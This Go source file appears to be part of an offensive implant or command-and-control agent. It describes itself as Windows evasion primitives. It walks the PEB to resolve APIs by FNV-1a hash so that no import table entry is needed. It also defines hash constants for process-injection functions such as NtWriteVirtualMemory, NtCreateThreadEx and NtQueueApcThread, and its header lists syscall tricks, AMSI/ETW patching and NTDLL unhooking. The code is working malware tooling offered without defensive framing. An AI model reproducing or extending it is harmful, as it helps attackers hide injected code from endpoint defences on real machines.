//go:build windows

// Package win implements the Windows evasion primitives: PEB-walk API
// resolution, Hell's Gate / Halo's Gate SSN extraction, direct and indirect
// syscall call paths, AMSI/ETW patching, NTDLL unhooking and sleep masking.
//
// Everything is compiled out on non-Windows platforms; the agent builds on
// Linux/macOS with these files excluded.
package win

import (
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// FNV-1a hashes of the WinAPI / NT API names the evasion layer resolves. The
// SSN resolver and the syscall stubs share these constants so no import table
// entry is needed for the sensitive functions. Verified against hashAnsi().
const (
	HashNtAllocateVirtualMemory = uint32(0xca67b978)
	HashNtFreeVirtualMemory     = uint32(0xb51cc567)
	HashNtProtectVirtualMemory  = uint32(0xbd799926)
	HashNtWriteVirtualMemory    = uint32(0x43e32f32)
	HashNtCreateThreadEx        = uint32(0xed0594da)
	HashNtQueueApcThread        = uint32(0xb10f026c)
	HashNtResumeThread          = uint32(0xe06437fc)
	HashNtOpenProcess           = uint32(0x5ea49a38)
	HashRtlCopyMemory           = uint32(0x39620f0f)
	HashRtlInitUnicodeString    = uint32(0x3376500f)
	HashLdrLoadDll              = uint32(0x7b566b5f)
)

// hashAnsi FNV-1a hashes an ASCII string (export names are ASCII).
func hashAnsi(s string) uint32 {
	h := uint32(0x811c9dc5)
	for i := 0; i < len(s); i++ {
		h ^= uint32(s[i])
		h *= 0x01000193
	}
	return h
}

// getExport walks a module's export directory and returns the address of the
// function whose name hashes to `nameHash`. Reads are bounded by modEnd.
func getExport(moduleBase uintptr, nameHash uint32) uintptr {
	if moduleBase == 0 {
		return 0
	}
	dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(moduleBase))
	if dos.e_magic != 0x5A4D {
		return 0
	}
	nt := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(moduleBase + uintptr(dos.e_lfanew)))
	if nt.Signature != 0x00004550 || nt.FileHeader.Machine != 0x8664 {
		return 0
	}
	modEnd := moduleBase + uintptr(nt.OptionalHeader.SizeOfImage)
	edir := nt.OptionalHeader.DataDirectory[0]
	if edir.VirtualAddress == 0 || uintptr(edir.VirtualAddress)+unsafe.Sizeof(IMAGE_EXPORT_DIRECTORY{}) > uintptr(nt.OptionalHeader.SizeOfImage) {
		return 0
	}
	exp := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(moduleBase + uintptr(edir.VirtualAddress)))
	names := unsafe.Slice((*uint32)(unsafe.Pointer(moduleBase+uintptr(exp.AddressOfNames))), exp.NumberOfNames)
	ords := unsafe.Slice((*uint16)(unsafe.Pointer(moduleBase+uintptr(exp.AddressOfNameOrdinals))), exp.NumberOfNames)
	funcs := unsafe.Slice((*uint32)(unsafe.Pointer(moduleBase+uintptr(exp.AddressOfFunctions))), exp.NumberOfFunctions)
	for i := uint32(0); i < exp.NumberOfNames; i++ {
		namePtr := moduleBase + uintptr(names[i])
		if namePtr >= modEnd {
			continue
		}
		if hashAnsi(cStringBounded(namePtr, modEnd)) == nameHash {
			ord := ords[i]
			if int(ord) >= len(funcs) {
				continue
			}
			fnPtr := moduleBase + uintptr(funcs[ord])
			if fnPtr >= modEnd {
				continue
			}
			return fnPtr
		}
	}
	return 0
}

// cString reads a null-terminated ASCII string.
func cString(p uintptr) string {
	return cStringBounded(p, ^uintptr(0))
}

// cStringBounded reads a null-terminated ASCII string without crossing limit.
func cStringBounded(p, limit uintptr) string {
	if p == 0 {
		return ""
	}
	var b []byte
	for p < limit {
		c := *(*byte)(unsafe.Pointer(p))
		if c == 0 {
			break
		}
		b = append(b, c)
		p++
	}
	return string(b)
}

// moduleList returns the base of the first module whose DLL base name equals
// `baseName` (e.g. "ntdll.dll"), walking PEB->Ldr->InMemoryOrderModuleList.
// NOTE: the list node (`e`) points at the entry's InMemoryOrderLinks field,
// which sits at offset 16 inside LDR_DATA_TABLE_ENTRY (after the 2-word
// reserved1), so the entry base is e-16. Casting e directly reads garbage.
func moduleList(baseName string) uintptr {
	peb := windows.RtlGetCurrentPeb()
	if peb == nil || peb.Ldr == nil {
		return 0
	}
	const inMemoryOrderOffset = 16
	first := &peb.Ldr.InMemoryOrderModuleList
	for e := first.Flink; e != nil && e != first; e = e.Flink {
		entry := (*windows.LDR_DATA_TABLE_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(e)) - inMemoryOrderOffset))
		name := entry.FullDllName.String()
		short := name
		if i := strings.LastIndexAny(name, `/\`); i >= 0 {
			short = name[i+1:]
		}
		if strings.EqualFold(short, baseName) {
			return entry.DllBase
		}
	}
	return 0
}

// ModuleNtdll returns the base address of ntdll via the PEB module list.
func ModuleNtdll() uintptr {
	return moduleList("ntdll.dll")
}

// ModuleKernel32 returns the base address of kernel32 via the PEB module list.
func ModuleKernel32() uintptr {
	return moduleList("kernel32.dll")
}

// Resolve returns the address of a named export of a module (no IAT).
func Resolve(moduleBase uintptr, name string) (uintptr, error) {
	if moduleBase == 0 {
		return 0, fmt.Errorf("win: nil module base")
	}
	addr := getExport(moduleBase, hashAnsi(name))
	if addr == 0 {
		return 0, fmt.Errorf("win: export %q not found", name)
	}
	return addr, nil
}

// Peek reads `n` bytes at address `p` (used by the SSN scanner and patches).
func Peek(p uintptr, n int) []byte {
	out := make([]byte, n)
	for i := 0; i < n; i++ {
		out[i] = *(*byte)(unsafe.Pointer(p + uintptr(i)))
	}
	return out
}

// DumpExport hex-dumps the first n bytes of a named ntdll export (diagnostics).
func DumpExport(name string, n int) string {
	ntdll := ModuleNtdll()
	addr, err := Resolve(ntdll, name)
	if err != nil {
		return "resolve failed: " + err.Error()
	}
	b := Peek(addr, n)
	out := fmt.Sprintf("%s @0x%x: ", name, addr)
	for i, c := range b {
		out += fmt.Sprintf("%02x ", c)
		if i%16 == 15 {
			out += "\n"
		}
	}
	return out
}

// VirtualProtectLocal flips memory protection of a local region (kernel32).
func VirtualProtectLocal(addr uintptr, size uintptr, protect uint32) (uint32, error) {
	k32 := ModuleKernel32()
	proc, err := Resolve(k32, "VirtualProtect")
	if err != nil {
		return 0, err
	}
	var old uint32
	r1, _, e1 := syscallN(proc, addr, size, uintptr(protect), uintptr(unsafe.Pointer(&old)), 0, 0)
	if r1 == 0 {
		return 0, e1
	}
	return old, nil
}
